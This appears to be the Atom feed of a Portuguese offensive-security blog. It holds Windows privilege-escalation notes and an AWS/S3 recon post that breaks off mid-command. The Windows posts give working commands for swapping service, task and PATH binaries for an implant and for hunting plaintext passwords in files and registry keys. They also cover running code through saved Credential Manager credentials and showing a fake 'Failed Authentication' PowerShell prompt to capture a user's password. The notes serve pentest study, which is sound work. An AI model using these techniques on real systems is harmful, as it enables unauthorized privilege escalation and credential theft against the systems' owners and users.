<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://geleiaa.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://geleiaa.github.io/" rel="alternate" type="text/html"/><updated>2024-05-22T17:59:48+00:00</updated><id>https://geleiaa.github.io/feed.xml</id><title type="html">blank</title><subtitle>Blog de hackinagens. </subtitle><entry><title type="html">windows priv-esc pt3</title><link href="https://geleiaa.github.io/blog/2024/winprivesc_pt3/" rel="alternate" type="text/html" title="windows priv-esc pt3"/><published>2024-05-16T00:00:00+00:00</published><updated>2024-05-16T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/winprivesc_pt3</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/winprivesc_pt3/"><![CDATA[<h2 id="-execution-flow-hijacking"># Execution Flow Hijacking</h2> <blockquote> <h4 id="unsecured-file-system">Unsecured File System</h4> </blockquote> <ul> <li>Busca em todo o disk C:\ por arquivos com perms read/write no grupo Users e Authenticated Users</li> <li><code class="language-plaintext highlighter-rouge">accesschk.exe -accepteula -wus "Users" c:\*.* &gt; output.txt</code></li> <li><code class="language-plaintext highlighter-rouge">accesschk.exe -accepteula -wus "Authenticated Users" c:\*.* &gt; auth-usr.txt</code> <ul> <li>em um cenário real você faz download do arquivo para a attack machine e analisa “offiline”</li> </ul> </li> <li>Basicamente, procurando por paths de executaveis com perms read/write, a ideia é usar a tecnica de Execution Flow Hijacking <a href="https://attack.mitre.org/techniques/T1574/007/">https://attack.mitre.org/techniques/T1574/007/</a> para substituir um binario legitimo pelo implant. Fazendo com que o implant, quando executado, “chame” o binario legitimo depois de executar o payload em um processo diferente…</li> </ul> <p>demo em breve???…</p> <p>READ/REFS:</p> <ul> <li><a href="https://helgeklein.com/blog/finding-executables-in-user-writeable-directories/">https://helgeklein.com/blog/finding-executables-in-user-writeable-directories/</a></li> </ul> <blockquote> <h4 id="explorando-env-vars-paths-path-interception-by-path-environment-variable">Explorando Env Vars paths (Path Interception by PATH Environment Variable)</h4> </blockquote> <ul> <li>Vendo as env vars</li> <li> <p><code class="language-plaintext highlighter-rouge">reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"</code> ou <code class="language-plaintext highlighter-rouge">set</code></p> </li> <li>Checando perm de write no env PATH</li> <li> <p><code class="language-plaintext highlighter-rouge">icacls c:\rto\bin</code></p> </li> <li>Se houver um caminho controlável nesta lista colocado, você poderá fazer com que o sistema execute seus próprios binários em vez dos reais.</li> <li><code class="language-plaintext highlighter-rouge">copy c:\implant\implant.exe c:\bin\notepad.exe</code></li> </ul> <p>READ/REFS:</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1574/007/">https://attack.mitre.org/techniques/T1574/007/</a></li> </ul> <blockquote> <h4 id="explorando-services-sem-o-binario-no-path">Explorando Services sem o binario no path</h4> </blockquote> <ul> <li>Buscando por services sem binario</li> <li> <p><code class="language-plaintext highlighter-rouge">c:\autorunsc64.exe -a s | more</code></p> </li> <li>Info do service</li> <li><code class="language-plaintext highlighter-rouge">C:\&gt; sc query &lt;service-name&gt;</code> - lista services</li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; sc qc &lt;service-name&gt;</code> - info do service</p> </li> <li>Substituindo o binario</li> <li> <p><code class="language-plaintext highlighter-rouge">copy c:implant\implant.exe c:\path-to-service-sem-bin</code></p> </li> <li> <p>restart no service:</p> </li> <li><code class="language-plaintext highlighter-rouge">sc stop &lt;service-name&gt;</code> e <code class="language-plaintext highlighter-rouge">sc start &lt;service-name&gt;</code></li> </ul> <blockquote> <h4 id="explorando-task-sem-binario-no-path">Explorando Task sem binario no path</h4> </blockquote> <p>A ideia é a mesma do Service sem binario…</p> <ul> <li>Buscando por Tasks sem bin:</li> <li> <p><code class="language-plaintext highlighter-rouge">c:\autorunsc64.exe -a s | more</code></p> </li> <li>Checando configs da Task:</li> <li><code class="language-plaintext highlighter-rouge">schtasks /query /tn &lt;task-name&gt; /xml</code></li> </ul> <p>Nas configs procure pelo <code class="language-plaintext highlighter-rouge">&lt;UserId&gt;</code> (CID) para verificar a qual user pertence a task. Olhe também as configs <code class="language-plaintext highlighter-rouge">&lt;LogonType&gt;</code> e <code class="language-plaintext highlighter-rouge">&lt;RunLevel&gt;</code> para mais info do user daquela task. Por ultimo, verifique a config <code class="language-plaintext highlighter-rouge">&lt;Triggers&gt;</code> que diz como aquela task é iniciada e com isso voĉe saberá como inicia-la.</p> <ul> <li>Substituindo binario:</li> <li> <p><code class="language-plaintext highlighter-rouge">copy c:implant\implant.exe C:\path-to-service-sem-bin</code></p> </li> <li>Checando username do UserId (CID)</li> <li><code class="language-plaintext highlighter-rouge">wmic useraccount where sid='S-1-5-21-3461203602-4096304019-2269080069-1003' get name</code></li> </ul> <p>READ/REFS:</p> <ul> <li><a href="https://amr-git-dot.github.io/offensive/Priv-esc/">https://amr-git-dot.github.io/offensive/Priv-esc/</a></li> <li><a href="https://gitbook.brainyou.stream/basic-windows/tcm-win-privesc#insecure-folders-files">https://gitbook.brainyou.stream/basic-windows/tcm-win-privesc#insecure-folders-files</a></li> </ul> <blockquote> <h4 id="dll-hijacking-for-priv-esc">DLL Hijacking (for priv-esc)</h4> </blockquote> <p>O DLL Hijacking envolve a manipulação de um programa confiável para carregar uma DLL maliciosa. Existem varias táticas como DLL Spoofing, Injection e Side-Loading. É utilizado principalmente para execução de código, persistência e, menos comumente, priv-esc. E nesse caso aqui será para priv-esc…</p> <ul> <li> <p>Encontre em programa com DLL’s marcadas como NOT FOUND</p> </li> <li> <p>Ache uma DLL para hijack</p> </li> <li>Depois procure pelas funções especificas que o programa tenta importar da DLL not found: <ul> <li>dump da import table</li> <li><code class="language-plaintext highlighter-rouge">c:\ dumpbin imports c:\path_to_target_program</code></li> </ul> </li> <li>Sabendo as funções que um programa tenta importar você pode pesquisar pelo implementação dessa DLL e tentar hijack…</li> </ul> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sim, os requisitos são complicados de encontrar, pois por padrão é meio estranho encontrar um executável privilegiado sem uma dll e é ainda mais estranho ter permissões de gravação em uma pasta do caminho do sistema (você não pode por padrão). Mas, em ambientes mal configurados isso é possível.
</code></pre></div></div> <p>READ/REFS:</p> <ul> <li><a href="https://akimbocore.com/article/privilege-escalation-dll-hijacking/">https://akimbocore.com/article/privilege-escalation-dll-hijacking/</a></li> <li><a href="https://www.ired.team/offensive-security/privilege-escalation/t1038-dll-hijacking">https://www.ired.team/offensive-security/privilege-escalation/t1038-dll-hijacking</a></li> <li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#escalating-privileges">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#escalating-privileges</a></li> <li><a href="https://steflan-security.com/windows-privilege-escalation-dll-hijacking/">https://steflan-security.com/windows-privilege-escalation-dll-hijacking/</a></li> </ul> <blockquote> <h4 id="uac">UAC</h4> </blockquote> <ul> <li><a href="https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control">https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control</a></li> <li><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></li> </ul> <p>…</p>]]></content><author><name></name></author><category term="windows"/><category term="bhatagem"/><summary type="html"><![CDATA[serie de windows Priv-Esc]]></summary></entry><entry><title type="html">windows priv-esc pt2</title><link href="https://geleiaa.github.io/blog/2024/winprivesc_pt2/" rel="alternate" type="text/html" title="windows priv-esc pt2"/><published>2024-05-15T00:00:00+00:00</published><updated>2024-05-15T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/winprivesc_pt2</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/winprivesc_pt2/"><![CDATA[<p>A primeira parte dessa serie teve algumas notas sobre services, permissões, privilégios, etc. Logo quando terminei a primeira vi que ja estava muita coisa pra um post só, então decidi dividir em mais duas partes, sendo três partes no total… Essa segunda parte aborda algumas tecnicas sobre priv-esc com permissões de services e junto algumas referências para leitura adicional.</p> <h2 id="-insecured-objects-non-admin-medium-il"># Insecured Objects (Non Admin Medium IL)</h2> <blockquote> <h3 id="insecured-services">Insecured Services</h3> </blockquote> <h4 id="priv-esc-usando-insecured-objects-especificamente-abusando-dos-windows-services">Priv Esc usando insecured objects, especificamente abusando dos Windows Services.</h4> <h4 id="a-primeira-tecnica-é-chamada-insecure-service-path-unquoted-and-with-spaces-in-paths">A primeira tecnica é chamada <code class="language-plaintext highlighter-rouge">Insecure Service Path</code> (unquoted and with spaces in paths):</h4> <ul> <li>Ache services com espaços no binary path</li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></p> </li> <li>Exploration <ul> <li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths</a></li> <li><a href="https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths">https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths</a></li> </ul> </li> </ul> <h4 id="a-segunda-tecnica-é-chamada-de-insecure-config-services-ou-weak-services-permission">A segunda tecnica é chamada de <code class="language-plaintext highlighter-rouge">insecure config services</code> ou <code class="language-plaintext highlighter-rouge">weak services permission</code></h4> <ul> <li> <p>Permite um usuário com poucos privilégios ter permissão para alterar a configuração de um service. Por exemplo, alterar o binário que um service usa quando inicia…</p> </li> <li> <p>Isso mostrará uma lista de cada service e os grupos que têm permissões de gravação para esse service. Fornecer um grupo limitará a saída aos serviços para os quais o grupo tem permissão de gravação:</p> </li> <li><code class="language-plaintext highlighter-rouge">C:\&gt; accesschk.exe -accepteula -wuvc "Authenticated Users" *</code></li> <li><code class="language-plaintext highlighter-rouge">C:\&gt; accesschk.exe -accepteula -wuvc "Users" *</code></li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; accesschk.exe -accepteula -wuvc "Everyone" *</code></p> </li> <li>Para ver as configs do service:</li> <li><code class="language-plaintext highlighter-rouge">C:\&gt; sc query &lt;service-name&gt;</code> - lista services</li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; sc qc &lt;service-name&gt;</code> - info do service</p> </li> <li>Alterar a config e restart no service (se precisar)</li> <li><code class="language-plaintext highlighter-rouge">sc config &lt;serivce-name&gt; binPath= "c:\implant\implant.exe"</code></li> <li> <p><code class="language-plaintext highlighter-rouge">sc start &lt;service-name&gt;</code></p> </li> <li>Exploration <ul> <li><a href="https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/">https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/</a></li> <li><a href="https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/">https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/</a></li> <li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#permissions">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#permissions</a></li> <li><a href="https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions">https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions</a></li> </ul> </li> </ul> <h4 id="a-terceira-tecnica-é-modificar-permissões-dos-registries-weak-registry-permissions">A terceira tecnica é modificar permissões dos Registries (weak registry permissions)</h4> <ul> <li>Lista dos services</li> <li><code class="language-plaintext highlighter-rouge">C:\&gt; accesschk.exe -accepteula -kwuqsw hklm\System\CurrentControlSet\services &gt; output.txt</code> <ul> <li>em um cenário real você faz download do arquivo para a attack machine e analisa “offline”</li> </ul> </li> <li> <p>reconfigurando services vulneraveis:</p> </li> <li>Ver os paths do binarios:</li> <li> <p><code class="language-plaintext highlighter-rouge">reg query HKLM\SYSTEM\CurrentControlSet\services\ /s /v imagepath</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">reg add HKLM\SYSTEM\CurrentControlSet\services\&lt;service-name&gt; /v ImagePath /t REG_EXPAND_SZ /d C:\implant\implant.exe /f</code></p> </li> <li>Exploration <ul> <li><a href="https://cr0mll.github.io/cyberclopaedia/Post%20Exploitation/Privilege%20Escalation/Windows/Misconfigured%20Services/Weak%20Registry%20Permissions.html">https://cr0mll.github.io/cyberclopaedia/Post%20Exploitation/Privilege%20Escalation/Windows/Misconfigured%20Services/Weak%20Registry%20Permissions.html</a></li> <li><a href="https://systemweakness.com/windows-privilege-escalation-weak-registry-permissions-9060c1ca7c10">https://systemweakness.com/windows-privilege-escalation-weak-registry-permissions-9060c1ca7c10</a></li> <li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions</a></li> <li><a href="https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/">https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/</a></li> </ul> </li> </ul> <blockquote> <hr/> </blockquote>]]></content><author><name></name></author><category term="windows"/><category term="bhatagem"/><summary type="html"><![CDATA[serie de windows Priv-Esc]]></summary></entry><entry><title type="html">windows priv-esc pt1</title><link href="https://geleiaa.github.io/blog/2024/winprivesc_pt1/" rel="alternate" type="text/html" title="windows priv-esc pt1"/><published>2024-05-10T00:00:00+00:00</published><updated>2024-05-10T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/winprivesc_pt1</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/winprivesc_pt1/"><![CDATA[<h2 id="windows-lpe-notes">Windows LPE notes…</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Priv-esc base:
  1. Pegar SYSTEM perm
  2. Assumir outro usuário
  3. Mudar integrity levels
  4. Tirar proveito de tokens
  5. Ganhar mais privilégios  
</code></pre></div></div> <ul> <li> <p>De um lado temos os resources do sistema como arquivos, diretórios ou registries. E ous outros são usuários/process que desejam utilizar esses recursos…</p> </li> <li> <p>Entre resouces e process temos a divisão do sistema em que os process podem acessar qual recurso … Como o acesso aos recursos é concedido ou negado ?? Então quando um resource possui o <code class="language-plaintext highlighter-rouge">SECURITY DESCRIPTOR</code> que é composto por <code class="language-plaintext highlighter-rouge">OWNER</code>, <code class="language-plaintext highlighter-rouge">GROUP</code> e <code class="language-plaintext highlighter-rouge">ACLs</code> que descrevem quem pode ou não acessar os resources. Por outro lado, os process usam tokens de acesso que são objects dedicados que descrevem a identidade do usuário. E o <code class="language-plaintext highlighter-rouge">SECURITY REFERENCE MONITOR</code> no Kernel verifica até mesmo a call de um process específico para um acesso específico é permitida ou não. Primeiro é verificado o <code class="language-plaintext highlighter-rouge">INTEGRITY LEVEL</code> depois é verificado o OWNER e a ACL do resource.</p> </li> <li>O process e os threads herdam um token dos parent process. Os Tokens de Acesso são a base de todas as autorizações ou “decisões” no sistema, concedidas ao usuário autorizado pelo LASS. Cada token de acesso inclui o <code class="language-plaintext highlighter-rouge">CID</code> dos usuários.</li> <li><code class="language-plaintext highlighter-rouge">Primary Tokens</code> = default security information of process or thread.</li> <li> <p><code class="language-plaintext highlighter-rouge">Impersonation Tokens</code> = permite realizar operações utilizando token de acesso de outro usuário.</p> </li> <li><code class="language-plaintext highlighter-rouge">PRIVILEGIES</code> e <code class="language-plaintext highlighter-rouge">ACCESS RIGHTS</code> tem duas diferenças principais: Privilegies controlam o acesso a tarefas relacionadas ao sistema e Access Rights controlam o acesso a objects. A segunda diferença é que os Privilegies são atribuídos a contas de usuário/grupo e os Access Rights atribuídos a ACLs de objetos.</li> </ul> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Privilegies:
  - Atribuido a users e groups
  - operações no sistema:
    - instalar/carregar drives
    - shutdown
    - mudar timezone


- Access Rights:
  - Atrbuido a Objects ACL
  - Acessar Objects protegidos:
    - arquivos/pastas, registry keys, services, network shares, access tokens...
</code></pre></div></div> <ul> <li> <p>O <code class="language-plaintext highlighter-rouge">User Access control</code> (UAC) é um componente fundamental da visão geral de segurança da MS. O UAC ajuda a mitigar o impacto de malwares. Cada aplicativo que requer o administrator access token deve solicitar-lo. A única exceção é o relacionamento que existe entre <code class="language-plaintext highlighter-rouge">parent processes</code>. Os <code class="language-plaintext highlighter-rouge">Child Processes</code> herdam o acess token do <code class="language-plaintext highlighter-rouge">parent process</code>. Entretanto, os parents e child process devem ter o mesmo <code class="language-plaintext highlighter-rouge">Integrity Level</code>. O Windows protege processes marcando seus integrity levels. Os Integrity Levels são medidas de confiança. Um programa integrity “alta” é aquele que executa tarefas que modificam dados do sistema, como um programa de particionamento de disco, enquanto um programa de integrity “baixa” é aquele que executa tarefas que podem comprometer o sistema operacional, como um navegador da Web. Programas com integrity level mais baixos não podem modificar dados em programas com integrity levels mais altos. Quando um usuário padrão tenta executar um programa que requer um access token de administrator, o UAC exige que o usuário forneça credenciais de administrador válidas.</p> </li> <li>Integrity Level <ul> <li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels</a></li> </ul> </li> <li>Filtered Admin Token or Restricted Access Token <ul> <li><a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e">https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e</a></li> <li><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens">https://learn.microsoft.com/en-us/windows/win32/secauthz/restricted-tokens</a></li> </ul> </li> <li>Permissões “perigosas”? <ul> <li><code class="language-plaintext highlighter-rouge">SeBackupPriv</code> - read qualquer arquivo</li> <li><code class="language-plaintext highlighter-rouge">SeRestorePriv</code> - write em qualquer arquivo</li> <li><code class="language-plaintext highlighter-rouge">SeTakeOwnershipPriv</code> - se tornar owner</li> <li><code class="language-plaintext highlighter-rouge">SeTcbPriv</code> - se tornar parte do TCB</li> <li><code class="language-plaintext highlighter-rouge">SeLoadDriverPriv</code> - load/unload drivers</li> <li><code class="language-plaintext highlighter-rouge">SeCreateTokenPriv</code> - criar primary token</li> <li><code class="language-plaintext highlighter-rouge">SeImpersonatePriv</code> - se tornar outro user</li> <li><code class="language-plaintext highlighter-rouge">SeDebugPriv</code> - acessar a memória de qualquer process</li> </ul> </li> </ul> <h4 id="readrefs">READ/REFS</h4> <ul> <li><a href="https://www.pwndefend.com/2021/08/18/windows-security-fundamentals-lpe/">https://www.pwndefend.com/2021/08/18/windows-security-fundamentals-lpe/</a></li> <li><a href="https://dmfrsecurity.com/2021/05/16/review-red-team-operator-privilege-escalation-in-windows-course-by-sektor7-institute/">https://dmfrsecurity.com/2021/05/16/review-red-team-operator-privilege-escalation-in-windows-course-by-sektor7-institute/</a></li> </ul> <blockquote> <hr/> </blockquote> <h3 id="-gathering-creds"># Gathering Creds</h3> <blockquote> <h3 id="procurando-senhas-em-plaintext">Procurando senhas em plaintext</h3> </blockquote> <ul> <li>lista todos os diretorios a partir do c:\</li> <li><code class="language-plaintext highlighter-rouge">C:\&gt; dir /b /a /s c:\ &gt; output.txt</code> <ul> <li>em um cenário real você faz download do arquivo para a attack machine e analisa “offline”</li> </ul> </li> <li>Filtra por arquivos com nome “passw”</li> <li><code class="language-plaintext highlighter-rouge">C:\&gt; type output.txt | findstr /i passw</code></li> </ul> <p>https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir#examples</p> <blockquote> <h3 id="nomes-e-extenções-de-arquivos-interessantes-para-verificar">Nomes e Extenções de arquivos interessantes para verificar</h3> </blockquote> <ul> <li> <p>Extenções: install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .conf, ,ini, .xml, .txt, .gpg, .pgp, .p12, .der, .crs, .cer, id_rsa, id_dsa, .ovpn, vnc, ftp, ssh, vpn, git, .kdbx, .db</p> </li> <li> <p>Arquivos: unattend.xml, Unattended.xml, sysprep.inf, sysprep.xml, VARIABLES.DAT, setupinfo, setupinfo.bak, web.config, SiteList.xml, .aws\credentials, .azure\accessTokens,json, .azure\azureProfile.json, gcloud\credentials.db, gcloud\legacy_credentials, gcloud\access_tokens.db</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; type output.txt | findstr /i algumas extenção</code></p> </li> </ul> <blockquote> <h3 id="arquivos-nos-registries">Arquivos nos Registries</h3> </blockquote> <ul> <li> <p><code class="language-plaintext highlighter-rouge">req query "HKCU\Software\ORL\WinVNC3\Passowrd"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query "HKCU\Software\TightVNC\Server"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query "HKCU\Software\SimonTatham\PuTTY\Sessions"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query "HKCU\Software\SimonTatham\PuTTY\Sessions\local"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query HKLM /f password /c REG_SZ /s</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">req query HKLM /f password /c REG_SZ /s</code></p> </li> </ul> <blockquote> <h3 id="abusing-credential-manager">Abusing Credential Manager</h3> </blockquote> <ul> <li>Credential Manager <ul> <li>O Credential Manager é uma espécie de cofre digital dentro do sistema Windows. O Windows armazena credenciais de registry, como usernames e senhas…</li> </ul> </li> <li> <p>Do ponto de vista do invasor, geralmente você não tem acesso a uma GUI… Então você usa a linha de comando. Na linha de comando existe uma ferramenta chamada “cmdkey”.</p> <ul> <li>O cmdkey também permite listar essas informações. <ul> <li><code class="language-plaintext highlighter-rouge">C:\&gt; cmdkey /list</code></li> </ul> </li> </ul> </li> <li>Podemos executar como Admin também: <ul> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; runas /user:admin cmd.exe</code> &lt;===== precisa de admin pass</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; runas /savedcred /user:admin cmd.exe</code></p> <ul> <li>windows vai até Credential Manager, verifica o usuário admin (consulta o banco de dados), extrai a senha do usuário admin e executa o processo. (execute como administrador com integrity level medium)</li> </ul> </li> </ul> </li> <li>Podemos listar todos os diretórios aos quais não temos acesso. <ul> <li><code class="language-plaintext highlighter-rouge">C:\&gt; runas /savedcred /user:admin "c:\windows\system32\cmd.exe /c dir /b /a /s c:\users\admin &gt; c:\output-admin.txt"</code> <ul> <li>em um cenário real você faz download do arquivo para a attack machine e analisa “offline”</li> </ul> </li> </ul> </li> <li>Também podemos usar esse comando para rodar um implant: <ul> <li><code class="language-plaintext highlighter-rouge">C:\&gt; runas /savedcred /user:admin "c:\path\to\implant.exe"</code></li> </ul> </li> </ul> <blockquote> <h3 id="extraindo-creds-do-credential-manager">Extraindo creds do Credential Manager</h3> </blockquote> <ul> <li> <p>Script from Empire…</p> </li> <li> <p>C:&gt; powershell import-module c:\path\to\cms.ps1 ; Enum-Creds</p> </li> </ul> <blockquote> <h3 id="popup-local-para-pegar-as-creds-de-um-user">Popup local para pegar as creds de um user</h3> </blockquote> <ul> <li> <p>Cria um popup que pede a senha do usuário atual</p> </li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::Username,[Environment]::UserDomainName); $cred.getnetworkcredential().password"</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">C:\&gt; powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'CHANGE THIS WITH OTHER USERNAME',[Environment]::UserDomainName); $cred.getnetworkcredential().password"</code></p> </li> </ul> <p>Links adicionais:</p> <ul> <li><a href="https://fuzzysecurity.com/tutorials/16.html">https://fuzzysecurity.com/tutorials/16.html</a></li> <li><a href="https://xz.aliyun.com/t/3618">https://xz.aliyun.com/t/3618</a></li> </ul> <blockquote> <hr/> </blockquote>]]></content><author><name></name></author><category term="windows"/><category term="bhatagem"/><summary type="html"><![CDATA[serie de windows Priv-Esc]]></summary></entry><entry><title type="html">aws recon</title><link href="https://geleiaa.github.io/blog/2024/aws_recon/" rel="alternate" type="text/html" title="aws recon"/><published>2024-04-14T00:00:00+00:00</published><updated>2024-04-14T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/aws_recon</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/aws_recon/"><![CDATA[<h2 id="-external-and-internal-recon"># External and Internal Recon</h2> <h3 id="-tools-for-automate"># Tools for automate</h3> <blockquote> <h3 id="scan-cloud-ip-ranges-to-find-domainssubdommains-from-ssl-certs">Scan cloud IP ranges to find domains/subdommains from SSl certs</h3> </blockquote> <h4 id="aws-ip-ranges">aws ip ranges:</h4> <ul> <li> <p>Amazon: <a href="http://bit.ly/2vUSjED">http://bit.ly/2vUSjED</a></p> </li> <li> <p><a href="https://github.com/lord-alfred/ipranges/blob/main/all/ipv4_merged.txt">https://github.com/lord-alfred/ipranges/blob/main/all/ipv4_merged.txt</a></p> </li> <li> <p><a href="http://kaeferjaeger.gay/">http://kaeferjaeger.gay/</a></p> </li> </ul> <h4 id="cloudrecon-tool">CloudRecon tool</h4> <ul> <li> <p><a href="https://github.com/g0ldencybersec/cloudrecon">https://github.com/g0ldencybersec/cloudrecon</a></p> </li> <li> <p>parse cloudrecon tool data collected:</p> <ul> <li> <p><code class="language-plaintext highlighter-rouge">$ grep -F '.DOMAIN.COM' domainfile_DB.txt | awk -F '[][]''{print $2}' | sed 's##\n#g' "DOMAIN.COM" | sort -fu | cut -d ',' -f1 | sort -u</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">$ grep -F '.DOMAIN.COM' domainfile_DB.txt | awk -F '[][]''{print $2}' | sed 's##\n#g' | sort -fu | cut -d ',' -f1 | sort -u</code></p> </li> </ul> </li> </ul> <blockquote> <h3 id="domainssub">Domains/Sub</h3> </blockquote> <h4 id="scan-for-cloud-assets-too">scan for cloud assets too</h4> <ul> <li><a href="https://github.com/nsonaniya2010/SubDomainizer">https://github.com/nsonaniya2010/SubDomainizer</a></li> </ul> <h4 id="resolve-ips-to-domains-via-ssl-cert">resolve ips to domains via ssl cert</h4> <ul> <li><a href="https://github.com/hakluke/hakip2host">https://github.com/hakluke/hakip2host</a></li> </ul> <h4 id="ssl-scrape-from-ips">ssl scrape from ips</h4> <ul> <li><a href="https://github.com/cheetz/sslScrape">https://github.com/cheetz/sslScrape</a></li> </ul> <blockquote> <h3 id="search-public-cloud-assets">Search public cloud assets</h3> </blockquote> <ul> <li> <p>Public cloud buckets <a href="https://buckets.grayhatwarfare.com/">https://buckets.grayhatwarfare.com/</a></p> </li> <li> <p><a href="https://github.com/initstring/cloud_enum">https://github.com/initstring/cloud_enum</a></p> </li> <li> <p><a href="https://github.com/0xsha/CloudBrute">https://github.com/0xsha/CloudBrute</a></p> </li> </ul> <blockquote> <h3 id="other-refs">other refs</h3> </blockquote> <ul> <li>aws enum tools</li> <li><a href="https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/cloud#aws-amazon-cloud-services">https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/cloud#aws-amazon-cloud-services</a></li> <li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology#public-cloud-assets">https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology#public-cloud-assets</a></li> <li><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum</a></li> </ul> <blockquote> <h3 id="s3-enum">S3 enum</h3> </blockquote> <h4 id="externalpublicunauthenticated">External/Public/Unauthenticated</h4> <p>1 - <a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum</a></p> <p>2 - Discovering Bucket Names:</p> <p>There are many ways to discover the names of Buckets. One of the easiest ways is when a company embeds content hosted in S3 on their website. Images, PDFs, etc., can all be hosted cheaply in S3 and linked from another site. These links will look like this:</p> <ul> <li><code class="language-plaintext highlighter-rouge">http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext</code> or <code class="language-plaintext highlighter-rouge">http://s3.amazonaws.com/BUCKETNAME/FILENAME.ext</code></li> </ul> <p>3 - Find public IP to see if it is s3 aws:</p> <ul> <li><code class="language-plaintext highlighter-rouge">$ dig sub.domain.com</code> and <code class="language-plaintext highlighter-rouge">$ nslookup IP</code></li> <li><code class="language-plaintext highlighter-rouge">$ dig +nocmd flaws.cloud any +multiline +noall +answer</code> and <code class="language-plaintext highlighter-rouge">$ nslookup IP</code></li> </ul> <p>4 - Enumerate Bucket:</p> <ul> <li>To test the openness of the bucket a user can just enter the URL in their web browser. A private bucket will respond with “Access Denied”. A public bucket will list the first 1,000 objects that have been stored.</li> </ul> <p>5 - Listing the Contents of Buckets:</p> <ul> <li><code class="language-plaintext highlighter-rouge">$ curl http://BUCKETNAME.s3.amazonaws.com/</code></li> <li><code class="language-plaintext highlighter-rouge">$ aws s3 ls s3://irs-form-990/ --no-sign-request</code></li> </ul> <p>6 - Downloading Objects:</p> <ul> <li><code class="language-plaintext highlighter-rouge">$ curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml</code></li> <li><code class="language-plaintext highlighter-rouge">$ aws s3 cp s3://irs-form-990/201101319349101615_public.xml . 